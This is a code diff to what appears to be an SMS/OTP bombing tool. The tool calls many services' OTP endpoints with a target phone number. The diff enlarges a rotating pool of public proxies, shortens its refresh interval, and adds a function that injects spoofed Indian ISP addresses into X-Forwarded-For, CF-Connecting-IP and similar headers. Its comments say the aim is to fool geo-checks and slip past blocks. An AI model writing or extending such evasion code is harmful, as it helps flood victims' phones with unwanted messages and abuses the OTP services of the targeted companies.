@@ -30,20 +30,34 @@ logger = logging.getLogger(__name__)
 # ═══════════════════════════════════════════════════════════════════════════════
 
 PROXY_SOURCES = [
+    # JUGAD 3: Extended proxy source list — IN-specific + fast global pools
+    # ProxyScrape — Indian IPs, multiple filter combos
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=8000&country=IN&ssl=all&anonymity=all",
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=8000&country=IN&ssl=all",
     "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=6000&country=IN,US,SG,GB&ssl=all&anonymity=elite",
+    "https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=5000&country=IN&ssl=all&anonymity=anonymous",
+    "https://api.proxyscrape.com/v2/?request=getproxies&protocol=http&timeout=10000&country=IN&ssl=yes&anonymity=all",
+    # Proxy-list.download
     "https://www.proxy-list.download/api/v1/get?type=http&anon=elite&country=IN",
     "https://www.proxy-list.download/api/v1/get?type=https&anon=elite&country=IN",
-    "https://proxylist.geonode.com/api/proxy-list?limit=100&page=1&sort_by=lastChecked&sort_type=desc&country=IN&protocols=http,https&speed=fast&filterUpTime=80",
+    "https://www.proxy-list.download/api/v1/get?type=http&anon=anonymous&country=IN",
+    # GeoNode — verified working proxies
+    "https://proxylist.geonode.com/api/proxy-list?limit=200&page=1&sort_by=lastChecked&sort_type=desc&country=IN&protocols=http,https&speed=fast&filterUpTime=80",
+    "https://proxylist.geonode.com/api/proxy-list?limit=200&page=1&sort_by=speed&sort_type=asc&country=IN&protocols=http,https",
+    # GitHub maintained lists
     "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
     "https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt",
+    "https://raw.githubusercontent.com/monosans/proxy-list/main/proxies/http.txt",
+    "https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt",
+    "https://raw.githubusercontent.com/mertguvencli/http-proxy-list/main/proxy-list/data.txt",
+    "https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt",
 ]
 
-TEST_URL      = "https://httpbin.org/ip"
-PROXY_TIMEOUT = 8
-MIN_POOL_SIZE = 5
-REFRESH_EVERY = 300
+TEST_URL      = "https://api.ipify.org"  # JUGAD 5: faster than httpbin, same result
+PROXY_TIMEOUT = 5                          # tighter timeout = faster pool build
+MIN_POOL_SIZE = 15   # JUGAD 4: larger pool = more rotation options
+REFRESH_EVERY = 180  # refresh every 3 min (was 5 min) — proxies die fast
+MAX_POOL_SIZE = 60   # cap at 60 tested proxies
 
 
 class ProxyPool:
@@ -190,6 +204,43 @@ _ACCEPT_LANGS = [
 
 def _rand_ua():   return random.choice(_UA_POOL)
 def _rand_lang(): return random.choice(_ACCEPT_LANGS)
+
+# ─── JUGAD 1: Fake Indian IP headers ──────────────────────────────────────────
+# Many smaller APIs trust X-Forwarded-For / CF-Connecting-IP headers for geo.
+# Injecting a real Indian ISP IP fools them into thinking request is from India.
+_INDIAN_IPS = [
+    "49.36.128.1",    # Reliance Jio, Mumbai
+    "49.44.64.1",     # Reliance Jio, Delhi
+    "103.4.96.1",     # Airtel, Bangalore
+    "103.21.124.1",   # Airtel, Mumbai
+    "122.160.0.1",    # Airtel broadband
+    "115.113.0.1",    # Vodafone Idea, Mumbai
+    "59.91.0.1",      # BSNL, Delhi
+    "117.196.0.1",    # BSNL, Kolkata
+    "182.68.0.1",     # BSNL, Hyderabad
+    "14.139.0.1",     # NKN / NIC, India
+    "103.47.144.1",   # Hathway, Mumbai
+    "103.24.96.1",    # ACT Fibernet, Bangalore
+    "152.57.0.1",     # Tata Teleservices
+    "103.197.96.1",   # You Broadband
+    "110.172.0.1",    # MTNL, Mumbai
+]
+
+def _rand_indian_ip() -> str:
+    return random.choice(_INDIAN_IPS)
+
+def _inject_indian_headers(h: dict) -> dict:
+    """Inject Indian IP spoofing headers to bypass geo-blocks."""
+    ip = _rand_indian_ip()
+    h["X-Forwarded-For"]   = ip
+    h["X-Real-IP"]         = ip
+    h["CF-Connecting-IP"]  = ip
+    h["True-Client-IP"]    = ip
+    h["X-Client-IP"]       = ip
+    h["X-Originating-IP"]  = ip
+    h["CF-IPCountry"]      = "IN"
+    h["X-Country-Code"]    = "IN"
+    return h
 
 
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -501,7 +552,6 @@ APIS = [
         },
         "ok_hint": "otp",
     },
-]
 
     # ══════════════════════════════════════════════════════════════════════════
     # 📱  SMS — Fresh working APIs (verified non-blocked)
@@ -1027,6 +1077,8 @@ async def call_api(api: dict, phone: str):
         h["sec-fetch-dest"]  = "empty"
         h["sec-fetch-mode"]  = "cors"
         h["sec-fetch-site"]  = "same-origin"
+        # JUGAD 2: Indian IP spoofing — fools APIs that geo-check headers
+        _inject_indian_headers(h)
         return _substitute(h, phone, phone_cc)
 
     for attempt in range(1 + MAX_RETRIES):
